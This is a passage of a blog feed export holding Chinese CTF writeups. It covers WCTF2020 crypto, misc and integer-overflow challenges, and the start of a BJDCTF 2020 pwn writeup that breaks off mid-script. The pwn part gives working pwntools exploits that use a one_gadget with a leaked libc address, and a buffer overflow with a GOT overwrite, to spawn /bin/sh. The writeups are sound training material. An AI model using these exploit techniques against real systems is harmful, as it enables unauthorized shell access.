0、1、2、.....  、25</span><br><span class="line">Using the RSA system </span><br><span class="line">Encryption:0156 0821 1616 0041 0140 2130 1616 0793</span><br><span class="line">Public Key:2537 and 13</span><br><span class="line">Private Key:2537 and 937</span><br><span class="line"></span><br><span class="line">flag: wctf2020&#123;Decryption&#125;</span><br></pre></td></tr></table></figure></div><p>私钥都给了，直接解就行…</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">2537</span></span><br><span class="line">e = <span class="number">13</span></span><br><span class="line">d = <span class="number">937</span></span><br><span class="line">c = [<span class="number">156</span>, <span class="number">821</span>, <span class="number">1616</span>, <span class="number">41</span>, <span class="number">140</span>, <span class="number">2130</span>, <span class="number">1616</span>, <span class="number">793</span>]</span><br><span class="line">m = [pow(i, d, N) <span class="keyword">for</span> i <span class="keyword">in</span> c]</span><br><span class="line">flag=[chr(ord(<span class="string">'a'</span>)+i) <span class="keyword">for</span> i <span class="keyword">in</span> m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'wctf2020&#123;%s&#125;'</span>%(<span class="string">''</span>.join(flag))</span><br></pre></td></tr></table></figure></div><blockquote><p>flag:  wctf2020{iloveyou}</p></blockquote><h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><p>给了n，拿到<a href="http://www.factordb.com" target="_blank" rel="noopener">factordb</a>可以直接分解</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line">c = <span class="number">28767758880940662779934612526152562406674613203406706867456395986985664083182</span></span><br><span class="line">n = <span class="number">73069886771625642807435783661014062604264768481735145873508846925735521695159</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p=<span class="number">189239861511125143212536989589123569301</span></span><br><span class="line">q=<span class="number">386123125371923651191219869811293586459</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print p</span></span><br><span class="line"><span class="comment"># print q</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line"><span class="comment"># print d</span></span><br><span class="line"></span><br><span class="line">m = pow(c, d, p*q)</span><br><span class="line"></span><br><span class="line">print( number.long_to_bytes(m) )</span><br></pre></td></tr></table></figure></div><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Space-Club"><a href="#Space-Club" class="headerlink" title="Space Club"></a>Space Club</h2><p>附件是一堆空格，长的代表1，短的代表0，得到二进制串儿转成字符串即可：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">7</span>]: a=<span class="number">0b01110111011000110111010001100110001100100011000000110010001100000111</span></span><br><span class="line">   ...: <span class="number">101101101000001100110111001001100101010111110011000101110011010111110111</span></span><br><span class="line">   ...: <span class="number">100100110000011101010111001001011111011001100110110001000000011001110101</span></span><br><span class="line">   ...: <span class="number">111101110011001100010111100001011111011100110011000101111000010111110111</span></span><br><span class="line">   ...: <span class="number">0011001100010111100001111101</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: hex(a)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">Out[<span class="number">8</span>]: <span class="string">'wctf2020&#123;h3re_1s_y0ur_fl@g_s1x_s1x_s1x&#125;'</span></span><br></pre></td></tr></table></figure></div><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>题目描述：</p><blockquote><p>《论语》：三人行，必有我师焉。</p></blockquote><p>附件是个py写的人脸识别软件，出题人tql… 识别到三个人就给flag~</p><p>人数不够，照片来凑。</p><h2 id="爬"><a href="#爬" class="headerlink" title="爬"></a>爬</h2><p>爬爬爬</p><p>先把pdf转成word格式(<a href="https://online2pdf.com/pdf2word" target="_blank" rel="noopener">pdf2word</a>) ，然后随手对图片缩放了一下，发现原来有两张图片：</p><p><a href="http://image.taqini.space/img/20200328204601.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="http://image.taqini.space/img/20200328204601.png" src="/img/loading.gif" class="lazyload"></a></p><p>打开docx文件找到图片，hex2str即可：</p><p><a href="http://image.taqini.space/img/20200328204257.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="http://image.taqini.space/img/20200328204257.png" src="/img/loading.gif" class="lazyload"></a></p><blockquote><p>flag: wctf2020{th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p}</p></blockquote><h2 id="Find-me"><a href="#Find-me" class="headerlink" title="Find me"></a>Find me</h2><p>直接搜字符串</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rabin2 -zz find_me.jpg | grep ctf</span></span><br><span class="line">7    0x00000828 0x00000828 36   74           utf16le wctf2020&#123;y$0$u_f$1$n$d$_M$e$e$e$e$e&#125;</span><br><span class="line">10   0x000010bc 0x000010bc 25   52           utf16le wctf2020&#123;y0u_f1nd_mE&gt;&gt;-+&#125;</span><br></pre></td></tr></table></figure></div><p>发现有俩？都试了下，有一个是对的，哪个是对的，我也忘了。</p><h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><p>这题比较好玩儿~ nc连接上是个shop界面：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Welcome to wctf2020 shop</span><br><span class="line">You can buy flags here</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">1. Balance</span><br><span class="line">2. Buy Flags</span><br><span class="line">3. Exit</span><br><span class="line"></span><br><span class="line"> Enter a menu selection</span><br></pre></td></tr></table></figure></div><p>选1显示余额只有2020，选2显示在售的有两种flag，便宜的999一个，可以一次购买多个，真的flag要100000刀，买不起。</p><p>作为一名pwn选手，直接整数溢出就完事儿了。让购买次数*999等于负数，看看能不能让卖家倒贴钱。</p><p>整型数最大值是<code>2147483647</code>，超过这个值就会溢出成负数：<code>2147483647+1=-2147483648</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: (<span class="number">2147483647</span>+<span class="number">2020</span>)/<span class="number">999</span>+<span class="number">1</span></span><br><span class="line">Out[<span class="number">1</span>]: <span class="number">2149636</span></span><br></pre></td></tr></table></figure></div><p>算一下只要买<code>2149636</code>个假flag就能完成溢出，试了一下，果然卖家贴钱了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The final cost is: -2147480932</span><br><span class="line"></span><br><span class="line">Your current balance after transaction: 2147482952</span><br></pre></td></tr></table></figure></div><p>然后就开开心心的拿着巨款去买真flag啦~</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> Enter a menu selection</span><br><span class="line">2</span><br><span class="line">Currently for sale</span><br><span class="line">1. Cheaper flag</span><br><span class="line">2. Real lag</span><br><span class="line">2</span><br><span class="line">Real flags cost 100000 dollars, and we only have 1 in stock</span><br><span class="line">Enter 1 to buy one1</span><br><span class="line">YOUR FLAG IS: wctf2020&#123;0h_noooo_y0u_r0b_my_sh0p&#125;</span><br></pre></td></tr></table></figure></div><h2 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h2><p>炒鸡好玩儿的misc~ </p><p>题目描述：</p><blockquote><p>链接: <a href="https://pan.baidu.com/s/1_mDokFTuHlscTkV1P6cZ3w" target="_blank" rel="noopener">https://pan.baidu.com/s/1_mDokFTuHlscTkV1P6cZ3w</a> 提取码: e5y3<br> I want a girl friend !!!<br>将结果用wctf2020{}再提交</p></blockquote><p>附件是一段手机按键音，百度了下，搜到这篇文章:<a href="https://gamous.cn/index.php/archives/43/" target="_blank" rel="noopener">听按键音识手机号 - DTMF</a></p><p><strong>DTMF</strong>(<strong>D</strong>ual-<strong>T</strong>one <strong>M</strong>ulti-<strong>F</strong>requency) 即双音多频信号，通过两个频率信号的叠加的方式传递信息。较脉冲信号而言，这种信号传递时稳定便捷，被用于电话系统的拨号信号。</p><p>如今，手机也大多默认以 DTMF 的声音作为拨号界面的按键音。因此，只要分析按键音即可从中识别到对应的号码。</p><table><thead><tr><th></th><th>1209Hz</th><th>1336Hz</th><th>1477Hz</th><th>1633Hz</th></tr></thead><tbody><tr><td><strong>697Hz</strong></td><td>1</td><td>2</td><td>3</td><td>A</td></tr><tr><td><strong>770Hz</strong></td><td>4</td><td>5</td><td>6</td><td>B</td></tr><tr><td><strong>852Hz</strong></td><td>7</td><td>8</td><td>9</td><td>C</td></tr><tr><td><strong>941Hz</strong></td><td>*</td><td>0</td><td>#</td><td>D</td></tr></tbody></table><p>一个高信号与低信号叠加表示 4*4 棋盘上的信号，在频谱中显示为上下俩条水平密集线，经过 FFT 变换可得到两个笔直波峰。</p><p>傅里叶变换貌似在大学数据采集课上学过，于是尝试了一下。。。这也太复杂了！放弃。。数学太难了。</p><p>然后开心地在Audacity菜单栏找到了频谱分析功能<del>~</del></p><p><a href="http://image.taqini.space/img/20200328034046.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="http://image.taqini.space/img/20200328034046.png" src="/img/loading.gif" class="lazyload"></a></p><p>对每个按键音进行频谱分析，可以得到两个信号频率值(图中峰值)，查<strong>DTMF</strong>表即可解得相应数字/字母。</p><p>后来在github上找到了一个七年前的脚本 <a href="https://github.com/hfeeki/dtmf/blob/master/dtmf-decoder.py" target="_blank" rel="noopener">dtmf-decoder.py</a> (还能用)，跑出来一串神秘数字：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">999</span>*<span class="number">666</span>*<span class="number">88</span>*<span class="number">2</span>*<span class="number">777</span>*<span class="number">33</span>*<span class="number">6</span>*<span class="number">999</span>*<span class="number">4</span>*<span class="number">444</span>*<span class="number">777</span>*<span class="number">555</span>*<span class="number">333</span>*<span class="number">777</span>*<span class="number">444</span>*<span class="number">33</span>*<span class="number">66</span>*<span class="number">3</span>*<span class="number">7777</span></span><br></pre></td></tr></table></figure></div><p>看了半天，也不知道这是神马玩意。乘法算式么？于是卡住了，就去做其他题了。</p><p>后来我拿起手机，灵机一动！这不是T9键盘么(“▔□▔)`</p><p><a href="http://image.taqini.space/img/65E524BBA435784B11AB8FA892CB614D.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="http://image.taqini.space/img/65E524BBA435784B11AB8FA892CB614D.jpg" src="/img/loading.gif" class="lazyload"></a></p><p>数字重复三次表示按键按下了三次，选择相应的字母….最终解得：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOUAREMYGIRLFRIENDS</span><br></pre></td></tr></table></figure></div><blockquote><p>flag:  wctf2020{youaremygirlfriends}</p></blockquote><p>这题太有意思了叭。。。</p><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>最后就晒一下得分榜叭~</p><p><a href="/home/taqini/.config/Typora/typora-user-images/image-20200330201143075.png" data-fancybox="group" data-caption="image-20200330201143075" class="fancybox"><img alt="image-20200330201143075" title="image-20200330201143075" data-src="/home/taqini/.config/Typora/typora-user-images/image-20200330201143075.png" src="/img/loading.gif" class="lazyload"></a></p><p><a href="http://image.taqini.space/img/577627EA4BC1FA4C746664FF4BA4E985.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="http://image.taqini.space/img/577627EA4BC1FA4C746664FF4BA4E985.jpg" src="/img/loading.gif" class="lazyload"></a></p><p><a href="https://imagin.vip/" target="_blank" rel="noopener">imagin师傅</a>  ddw  ε٩ (๑&gt; 灬 &lt;)۶з</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> bof </tag>
            
            <tag> re </tag>
            
            <tag> misc </tag>
            
            <tag> fsb </tag>
            
            <tag> ret2text </tag>
            
            <tag> crypto </tag>
            
            <tag> rsa </tag>
            
            <tag> base64 </tag>
            
            <tag> abs </tag>
            
            <tag> 整数溢出 </tag>
            
            <tag> got </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn Notebook解题本</title>
      <link href="/2020/03/29/pwn-notebook/"/>
      <url>/2020/03/29/pwn-notebook/</url>
      
        <content type="html"><![CDATA[<h1 id="Pwn-Notebook-发布"><a href="#Pwn-Notebook-发布" class="headerlink" title="Pwn Notebook 发布~"></a>Pwn Notebook 发布~</h1><p><a href="http://image.taqini.space/img/20200329134931.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="http://image.taqini.space/img/20200329134931.png" src="/img/loading.gif" class="lazyload"></a></p><p>以后wp什么的，就发到这里啦~</p><p>docsify轻便又好看，hexo你失宠啦哈哈哈哈~</p><blockquote><p>Pwn Notebook<a href="http://note.taqini.space" target="_blank" rel="noopener">传送门</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> docsify </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docsify </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届 BJDCTF 2020 Pwn Writeup (半官方)</title>
      <link href="/2020/03/23/bjd2nd-pwn-offical-wp/"/>
      <url>/2020/03/23/bjd2nd-pwn-offical-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最为第一届BJDCTF的参赛选手和本届比赛的二进制出题人+运维，真心祝愿BJDCTF越办越好！（说多了怕被打）</p><p><a href="http://image.taqini.space/img/ctr.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="http://image.taqini.space/img/ctr.jpg" src="/img/loading.gif" class="lazyload"></a></p><p>还是要啰嗦一句，本次BJDCTF为七校联盟<strong>萌新赛</strong>，同时在BUUCTF对外开发，感谢赵师傅的大力支持，以及各位外校师傅的捧场。</p><p>第一次出题，pwn貌似出难了，其实主要是想考察下linux基础，在这里给各位萌新们道歉啦。</p><a href="http://image.taqini.space/img/sorry.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:40%;" data-src="http://image.taqini.space/img/sorry.jpg" src="/img/loading.gif" class="lazyload"></a><p>不过还是希望大家能打下坚实的linux基础~</p><blockquote><p>p.s. ret2text3,4&amp;YDS是<a href="https://nightrainy.github.io/" target="_blank" rel="noopener">芝士</a>师傅出的，算账不要来找我鸭</p></blockquote><h2 id="一把梭-one-gadget-TaQini"><a href="#一把梭-one-gadget-TaQini" class="headerlink" title="一把梭(one_gadget) - TaQini"></a>一把梭(one_gadget) - TaQini</h2><p>考察点：one_gadget</p><p>题目给出了<code>printf</code>的地址，由此可算得libc基址，然后找<code>one_gadget</code>、计算libc中<code>one_gadget</code>地址</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me your one gadget:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%ld"</span>, &amp;v4);</span><br><span class="line">  v5 = v4;</span><br><span class="line">  v4();</span><br></pre></td></tr></table></figure></div><p><code>v4</code>是个函数指针，<code>scanf</code>的时候把<code>one_gadget</code>转成十进制输入即可getshell。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./one_gadget'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'./libc.so.6'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">one_gadget = <span class="number">0x106ef8</span> <span class="comment">#execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">printf_libc = libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">ru(<span class="string">'here is the gift for u:'</span>)</span><br><span class="line">printf = int(rc(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">info_addr(<span class="string">'printf'</span>,printf)</span><br><span class="line">libc_base = printf-printf_libc</span><br><span class="line">info_addr(<span class="string">'libc_base'</span>, libc_base)</span><br><span class="line">info_addr(<span class="string">'one gadget'</span>, one_gadget+libc_base)</span><br><span class="line">ru(<span class="string">'gadget:'</span>)</span><br><span class="line">sl(str(one_gadget+libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="Imagin的小秘密-secret-TaQini"><a href="#Imagin的小秘密-secret-TaQini" class="headerlink" title="Imagin的小秘密(secret) - TaQini"></a>Imagin的小秘密(secret) - TaQini</h2><p>考察点：缓冲区溢出、GOT表覆写</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data:000000000046D080 ; char buf[]</span><br><span class="line">.data:000000000046D080 buf             db &#39;Y0ur_N@me&#39;,0        </span><br><span class="line">.data:000000000046D080                                         </span><br><span class="line">.data:000000000046D08A                 align 10h</span><br><span class="line">.data:000000000046D090 times           dq offset unk_46D0C0    </span><br><span class="line">.data:000000000046D090                                         </span><br><span class="line">.data:000000000046D090 _data           ends</span><br></pre></td></tr></table></figure></div><p>程序开头<code>read(0, buf, 0x16)</code>，实际上<code>buf</code>大小只有0x10，后6字节会覆盖<code>times</code>变量</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">sub_401301</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#====================================#"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#             GAME OVER              #"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#====================================#"</span>);</span><br><span class="line">  sub_4011C2(<span class="string">"#        BYE BYE~                    #"</span>, <span class="number">18L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(buf, <span class="number">18L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_46B0A7);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"@====================================@"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>猜错退出程序时，有个<code>printf</code>打印<code>buf</code>内容，查看got表，发现<code>printf</code>和<code>system</code>只差0x10</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[0x46d038] system@GLIBC_2.2.5 -&gt; 0x401076 (system@plt+6) ◂— push   4</span><br><span class="line">[0x46d040] printf@GLIBC_2.2.5 -&gt; 0x401086 (printf@plt+6) ◂— push   5</span><br></pre></td></tr></table></figure></div><p>所以把<code>times</code>覆盖成<code>got[printf]</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf='/bin/sh;' ; got[printf] -&gt; system</span><br></pre></td></tr></table></figure></div><p><code>times</code>每猜对一次<strong>自减1</strong>，控制猜对的次数，即可构造出<code>system(&quot;/bin/sh&quot;)</code><br>exp:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sl(<span class="string">'/bin/sh;AAAAAAAA'</span>+p32(<span class="number">0x46d040</span>))</span><br><span class="line">secret = [<span class="number">18283</span>,<span class="number">11576</span>,<span 